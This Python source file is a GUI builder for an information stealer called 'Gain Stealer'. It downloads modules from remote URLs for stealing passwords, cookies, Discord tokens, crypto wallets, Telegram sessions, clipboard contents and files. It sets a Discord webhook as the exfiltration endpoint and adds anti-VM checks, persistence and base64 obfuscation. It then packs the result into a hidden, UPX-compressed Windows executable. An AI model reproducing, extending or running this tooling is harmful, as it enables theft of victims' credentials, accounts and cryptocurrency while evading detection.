import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import os
import json
import tempfile
import base64
import random
import string
import subprocess
import sys
import requests
from datetime import datetime

class ModularGainBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("Gain Stealer Modular Builder v6.0")
        self.root.geometry("1000x700")
        
        self.raw_urls = {
            'imports': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/imports.py',
            'config': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/config.py',
            'anti_analysis': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/anti_analysis.py',
            'password_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/password_stealer.py',
            'cookie_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/cookie_stealer.py',
            'token_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/token_stealer.py',
            'wallet_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/wallet_stealer.py',
            'system_info': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/system_info.py',
            'clipboard': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/clipboard.py',
            'telegram': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/telegram.py',
            'file_grabber': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/file_grabber.py',
            'data_handler': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/data_handler.py',
            'main': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/main.py'
        }
        
        # Değişkenler
        self.webhook_var = tk.StringVar(value="https://discord.com/api/webhooks/YOUR_WEBHOOK")
        self.output_var = tk.StringVar(value="gain")
        
        # Özellik seçenekleri
        self.features = {
            'passwords': tk.BooleanVar(value=True),
            'cookies': tk.BooleanVar(value=True),
            'tokens': tk.BooleanVar(value=True),
            'wallets': tk.BooleanVar(value=True),
            'files': tk.BooleanVar(value=True),
            'clipboard': tk.BooleanVar(value=True),
            'system_info': tk.BooleanVar(value=True),
            'telegram': tk.BooleanVar(value=False)
        }
        
        # Obfuscation
        self.obfuscation = {
            'remove_comments': tk.BooleanVar(value=True),
            'base64_encode': tk.BooleanVar(value=True),
            'add_junk': tk.BooleanVar(value=False)
        }
        
        # Anti-analysis
        self.anti_analysis = {
            'anti_vm': tk.BooleanVar(value=True),
            'startup_delay': tk.BooleanVar(value=True),
            'delay_seconds': tk.IntVar(value=30),
            'mutex': tk.BooleanVar(value=True),
            'persist': tk.BooleanVar(value=True)
        }
        
        self.compile_exe = tk.BooleanVar(value=True)
        
        self.setup_ui()
    
    def setup_ui(self):
        notebook = ttk.Notebook(self.root)
        notebook.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Sekmeler
        tabs = ['main', 'features', 'obfuscation', 'anti_analysis', 'build']
        
        for tab in tabs:
            frame = ttk.Frame(notebook)
            notebook.add(frame, text=tab.title())
            
            if tab == 'main':
                self.setup_main_tab(frame)
            elif tab == 'features':
                self.setup_features_tab(frame)
            elif tab == 'obfuscation':
                self.setup_obfuscation_tab(frame)
            elif tab == 'anti_analysis':
                self.setup_anti_analysis_tab(frame)
            elif tab == 'build':
                self.setup_build_tab(frame)
    
    def setup_main_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Gain Stealer Modular Builder", 
                 font=("Arial", 16, "bold")).pack(pady=(0, 20))
        
        # Webhook
        webhook_frame = ttk.Frame(frame)
        webhook_frame.pack(fill='x', pady=10)
        ttk.Label(webhook_frame, text="Discord Webhook:", width=15).pack(side='left')
        ttk.Entry(webhook_frame, textvariable=self.webhook_var, width=70).pack(side='left', padx=5)
        
        # Output
        output_frame = ttk.Frame(frame)
        output_frame.pack(fill='x', pady=10)
        ttk.Label(output_frame, text="Output Name:", width=15).pack(side='left')
        ttk.Entry(output_frame, textvariable=self.output_var, width=30).pack(side='left', padx=5)
        
        # Raw URLs edit
        ttk.Separator(frame).pack(fill='x', pady=20)
        ttk.Label(frame, text="Raw URLs Configuration", 
                 font=("Arial", 12, "bold")).pack(anchor='w', pady=(0, 10))
        
        self.urls_text = scrolledtext.ScrolledText(frame, height=10, width=80)
        self.urls_text.pack(fill='both', expand=True, pady=10)
        
        # Load default URLs
        urls_text = json.dumps(self.raw_urls, indent=2)
        self.urls_text.insert('1.0', urls_text)
        
        # Update button
        ttk.Button(frame, text="Update URLs", 
                  command=self.update_urls, width=20).pack(pady=10)
    
    def setup_features_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Stealer Features", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        features_list = [
            ("🔑 Passwords Stealer", 'passwords'),
            ("🍪 Cookies Stealer", 'cookies'),
            ("👤 Discord Tokens", 'tokens'),
            ("💰 Crypto Wallets", 'wallets'),
            ("📁 File Grabber", 'files'),
            ("📋 Clipboard Monitor", 'clipboard'),
            ("💻 System Information", 'system_info'),
            ("✈️ Telegram Sessions", 'telegram')
        ]
        
        for text, key in features_list:
            ttk.Checkbutton(frame, text=text, 
                           variable=self.features[key]).pack(anchor='w', pady=5)
    
    def setup_obfuscation_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Code Obfuscation", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        ttk.Checkbutton(frame, text="Remove Comments", 
                       variable=self.obfuscation['remove_comments']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Base64 Encode Main Code", 
                       variable=self.obfuscation['base64_encode']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Add Junk Code", 
                       variable=self.obfuscation['add_junk']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Compile to EXE", 
                       variable=self.compile_exe).pack(anchor='w', pady=20)
    
    def setup_anti_analysis_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Anti-Analysis Features", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        ttk.Checkbutton(frame, text="Anti-VM Detection", 
                       variable=self.anti_analysis['anti_vm']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Mutex Check (Single Instance)", 
                       variable=self.anti_analysis['mutex']).pack(anchor='w', pady=5)
        ttk.Checkbutton(frame, text="Persistence (Startup)", 
                       variable=self.anti_analysis['persist']).pack(anchor='w', pady=5)
        
        ttk.Checkbutton(frame, text="Startup Delay", 
                       variable=self.anti_analysis['startup_delay']).pack(anchor='w', pady=10)
        
        delay_frame = ttk.Frame(frame)
        delay_frame.pack(fill='x', pady=5)
        ttk.Label(delay_frame, text="Delay seconds:").pack(side='left')
        ttk.Spinbox(delay_frame, from_=5, to=300, 
                   textvariable=self.anti_analysis['delay_seconds'], 
                   width=10).pack(side='left', padx=10)
    
    def setup_build_tab(self, parent):
        frame = ttk.Frame(parent, padding="20")
        frame.pack(fill='both', expand=True)
        
        ttk.Label(frame, text="Build & Compile", 
                 font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
        
        self.log_text = scrolledtext.ScrolledText(frame, height=15, font=("Consolas", 9))
        self.log_text.pack(fill='both', expand=True, pady=10)
        
        btn_frame = ttk.Frame(frame)
        btn_frame.pack()
        
        ttk.Button(btn_frame, text="Download Modules", 
                  command=self.download_modules, width=20).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Build Python Script", 
                  command=lambda: self.build_stealer(compile_exe=False), 
                  width=20).pack(side='left', padx=5)
        ttk.Button(btn_frame, text="Build EXE", 
                  command=lambda: self.build_stealer(compile_exe=True), 
                  width=20).pack(side='left', padx=5)
    
    def update_urls(self):
        try:
            urls_text = self.urls_text.get('1.0', tk.END).strip()
            self.raw_urls = json.loads(urls_text)
            self.log("URLs updated successfully")
        except Exception as e:
            self.log(f"Error updating URLs: {str(e)}")
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def download_modules(self):
        self.log("Downloading modules from raw URLs...")
        
        self.modules = {}
        
        for module_name, url in self.raw_urls.items():
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    self.modules[module_name] = response.text
                    self.log(f"✓ Downloaded: {module_name}")
                else:
                    self.log(f"✗ Failed: {module_name} (HTTP {response.status_code})")
            except Exception as e:
                self.log(f"✗ Error downloading {module_name}: {str(e)}")
        
        self.log(f"Downloaded {len(self.modules)}/{len(self.raw_urls)} modules")
    
    def build_stealer(self, compile_exe=True):
        if not hasattr(self, 'modules') or not self.modules:
            self.log("Error: Modules not downloaded. Click 'Download Modules' first.")
            return
        
        # Check raw modules for placeholders
        self.check_raw_modules()
        
        self.log("Building stealer code...")
        
        try:
            final_code = ""
            
            # 1. Imports
            if 'imports' in self.modules:
                final_code += self.modules['imports'] + "\n\n"
            
            # 2. Config - FIXED: Çift tırnak problemi
            if 'config' in self.modules:
                webhook_url = self.webhook_var.get().strip()
                # Eğer config'de zaten tırnaklar varsa, sadece URL'yi değiştir
                if '{WEBHOOK_URL}' in self.modules['config']:
                    # URL'yi tırnak içine al
                    webhook_with_quotes = f'"{webhook_url}"'
                    config_code = self.modules['config'].replace('{WEBHOOK_URL}', webhook_with_quotes)
                else:
                    # Config'de WEBHOOK_URL = "..." formatı varsa, regex ile değiştir
                    import re
                    config_code = re.sub(r'WEBHOOK_URL\s*=\s*".*?"', f'WEBHOOK_URL = "{webhook_url}"', self.modules['config'])
                
                final_code += config_code + "\n\n"
            
            # 3. Anti-analysis (with conditions)
            if 'anti_analysis' in self.modules:
                anti_code = self.modules['anti_analysis']
                
                # Replace condition placeholders
                replacements = {
                    "{ANTI_VM}": str(self.anti_analysis['anti_vm'].get()).lower(),
                    "{STARTUP_DELAY}": str(self.anti_analysis['startup_delay'].get()).lower(),
                    "{DELAY_SECONDS}": str(self.anti_analysis['delay_seconds'].get()),
                    "{MUTEX}": str(self.anti_analysis['mutex'].get()).lower(),
                    "{PERSIST}": str(self.anti_analysis['persist'].get()).lower()
                }
                
                for placeholder, value in replacements.items():
                    anti_code = anti_code.replace(placeholder, value)
                
                final_code += anti_code + "\n\n"
            
            # 4. Feature modules (only if enabled)
            feature_modules = [
                ('password_stealer', 'passwords'),
                ('cookie_stealer', 'cookies'),
                ('token_stealer', 'tokens'),
                ('wallet_stealer', 'wallets'),
                ('system_info', 'system_info'),
                ('clipboard', 'clipboard'),
                ('telegram', 'telegram'),
                ('file_grabber', 'files')
            ]
            
            for module_name, feature_key in feature_modules:
                if module_name in self.modules and self.features[feature_key].get():
                    final_code += self.modules[module_name] + "\n\n"
            
            # 5. Data handler - FIXED: Placeholder kontrolü
            if 'data_handler' in self.modules:
                data_code = self.modules['data_handler']
                
                # Eğer data_handler'da {FEATURE_CONDITIONS} placeholder'ı yoksa,
                # zaten düzgün çalışan bir kod olduğunu varsayalım
                if "{FEATURE_CONDITIONS}" in data_code:
                    # Build conditions for each feature
                    conditions = ""
                    for module_name, feature_key in feature_modules:
                        if self.features[feature_key].get():
                            # Fonksiyon ismini doğru al (örn: passwords -> stealpasswords)
                            func_name = ''
                            if feature_key == 'passwords': func_name = 'stealpasswords'
                            elif feature_key == 'cookies': func_name = 'stealcookies'
                            elif feature_key == 'tokens': func_name = 'stealtokens'
                            elif feature_key == 'wallets': func_name = 'stealwallets'
                            elif feature_key == 'system_info': func_name = 'getsysteminfo'
                            elif feature_key == 'clipboard': func_name = 'monitorclipboard'
                            elif feature_key == 'telegram': func_name = 'stealtelegram'
                            elif feature_key == 'files': func_name = 'grabfiles'
                            
                            if func_name:
                                conditions += f"    # {feature_key}\n"
                                conditions += f"    try:\n"
                                conditions += f"        {feature_key} = {func_name}()\n"
                                conditions += f"        if {feature_key}:\n"
                                conditions += f"            data['{feature_key}'] = {feature_key}\n"
                                conditions += f"            with open(os.path.join(data_dir, '{feature_key}.json'), 'w', encoding='utf-8') as f:\n"
                                conditions += f"                json.dump({feature_key}, f, indent=2)\n"
                                conditions += f"    except:\n"
                                conditions += f"        pass\n\n"
                    
                    data_code = data_code.replace("{FEATURE_CONDITIONS}", conditions)
                
                final_code += data_code + "\n\n"
            
            # 6. Main code
            if 'main' in self.modules:
                final_code += self.modules['main'] + "\n\n"
            
            # Apply obfuscation
            if self.obfuscation['remove_comments'].get():
                final_code = self.remove_comments(final_code)
                self.log("Removed comments")
            
            if self.obfuscation['base64_encode'].get():
                final_code = self.base64_encode(final_code)
                self.log("Applied Base64 encoding")
            
            if self.obfuscation['add_junk'].get():
                final_code = self.add_junk_code(final_code)
                self.log("Added junk code")
            
            # Save Python file
            output_name = self.output_var.get().strip() or "gain"
            py_filename = output_name + ".py"
            
            with open(py_filename, 'w', encoding='utf-8') as f:
                f.write(final_code)
            
            self.log(f"✓ Python script saved: {os.path.abspath(py_filename)}")
            
            # Compile to EXE if requested
            if compile_exe and self.compile_exe.get():
                self.compile_to_exe(py_filename, output_name)
            else:
                messagebox.showinfo("Success", f"Python script saved:\n{os.path.abspath(py_filename)}")
            
        except Exception as e:
            self.log(f"✗ Build error: {str(e)}")
            import traceback
            self.log(traceback.format_exc())
            messagebox.showerror("Build Error", str(e))
    
    def check_raw_modules(self):
        """Check if all raw modules have required placeholders"""
        self.log("Checking module placeholders...")
        
        required_placeholders = {
            'config': ['{WEBHOOK_URL}'],
            'anti_analysis': ['{ANTI_VM}', '{STARTUP_DELAY}', '{DELAY_SECONDS}', '{MUTEX}', '{PERSIST}'],
            'data_handler': ['{FEATURE_CONDITIONS}']
        }
        
        for module_name, placeholders in required_placeholders.items():
            if module_name in self.modules:
                module_code = self.modules[module_name]
                for placeholder in placeholders:
                    if placeholder in module_code:
                        self.log(f"✓ {module_name} has placeholder: {placeholder}")
                    else:
                        self.log(f"⚠ {module_name} missing placeholder: {placeholder}")
    
    def remove_comments(self, code):
        lines = code.split('\n')
        clean_lines = []
        for line in lines:
            if '#' in line:
                line = line.split('#')[0]
            if line.strip():
                clean_lines.append(line)
        return '\n'.join(clean_lines)
    
    def base64_encode(self, code):
        encoded = base64.b64encode(code.encode()).decode()
        wrapper = f'''import base64
exec(base64.b64decode("{encoded}"))'''
        return wrapper
    
    def add_junk_code(self, code):
        import random
        import string
        
        junk_lines = [
            '# ' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)),
            'junk_var_' + str(random.randint(1000, 9999)) + ' = "' + ''.join(random.choices(string.ascii_letters, k=20)) + '"',
            'def junk_func_' + str(random.randint(1000, 9999)) + '(): pass'
        ]
        
        lines = code.split('\n')
        new_lines = []
        
        for line in lines:
            new_lines.append(line)
            if line.strip() and not line.strip().startswith('#') and random.random() > 0.7:
                new_lines.append(random.choice(junk_lines))
        
        return '\n'.join(new_lines)
    
    def compile_to_exe(self, py_filename, output_name):
        self.log("Compiling to EXE...")
        
        try:
            # Check if PyInstaller is installed
            try:
                subprocess.run(['pyinstaller', '--version'], 
                              capture_output=True, shell=True, timeout=5)
                self.log("✓ PyInstaller found")
            except:
                self.log("PyInstaller not found. Installing...")
                result = subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], 
                                      capture_output=True, text=True, shell=True)
                if result.returncode == 0:
                    self.log("✓ PyInstaller installed")
                else:
                    self.log(f"✗ Failed to install PyInstaller: {result.stderr}")
                    return
            
            # Build PyInstaller command
            pyinstaller_cmd = [
                'pyinstaller',
                '--onefile',
                '--windowed',
                '--noconsole',
                f'--name={output_name}',
                '--hidden-import=win32timezone',
                '--hidden-import=win32crypt',
                '--hidden-import=Crypto.Cipher',
                '--hidden-import=Crypto.Util.Padding',
                '--hidden-import=browser_cookie3',
                '--hidden-import=requests',
                '--hidden-import=psutil',
                '--add-data=*;.',
                '--clean'
            ]
            
            # Add UPX if available
            try:
                subprocess.run(['upx', '--version'], capture_output=True, shell=True)
                pyinstaller_cmd.append('--upx-exclude=vcruntime140.dll')
                self.log("✓ UPX found, will use compression")
            except:
                self.log("ℹ UPX not available")
            
            self.log(f"Running PyInstaller...")
            
            result = subprocess.run(pyinstaller_cmd + [py_filename], 
                                  capture_output=True, 
                                  text=True, 
                                  shell=True,
                                  timeout=300)  # 5 minute timeout
            
            if result.returncode == 0:
                exe_path = os.path.join('dist', output_name + '.exe')
                if os.path.exists(exe_path):
                    exe_size = os.path.getsize(exe_path) / 1024 / 1024
                    self.log(f"✓ EXE built successfully: {os.path.abspath(exe_path)}")
                    self.log(f"✓ Size: {exe_size:.2f} MB")
                    
                    # Try to compress with UPX separately
                    try:
                        subprocess.run(['upx', '--best', '--lzma', exe_path], 
                                     capture_output=True, shell=True)
                        compressed_size = os.path.getsize(exe_path) / 1024 / 1024
                        self.log(f"✓ UPX compressed: {compressed_size:.2f} MB")
                    except:
                        pass
                    
                    messagebox.showinfo("Success", 
                                      f"Build completed!\n\n"
                                      f"Python: {os.path.abspath(py_filename)}\n"
                                      f"EXE: {os.path.abspath(exe_path)}\n"
                                      f"Size: {exe_size:.2f} MB")
                else:
                    self.log("✗ EXE not found in dist folder")
                    self.log(f"PyInstaller output: {result.stdout}")
            else:
                self.log(f"✗ PyInstaller failed with code: {result.returncode}")
                self.log(f"PyInstaller stderr: {result.stderr[:500]}...")
                self.log(f"PyInstaller stdout: {result.stdout[:500]}...")
                
                # Common error solutions
                if "No module named" in result.stderr:
                    missing_module = result.stderr.split("No module named")[1].split("'")[1]
                    self.log(f"Try: pip install {missing_module}")
        
        except subprocess.TimeoutExpired:
            self.log("✗ PyInstaller timed out (5 minutes)")
        except Exception as e:
            self.log(f"✗ Compilation error: {str(e)}")
            import traceback
            self.log(traceback.format_exc())

if __name__ == "__main__":
    root = tk.Tk()
    app = ModularGainBuilder(root)
    root.mainloop()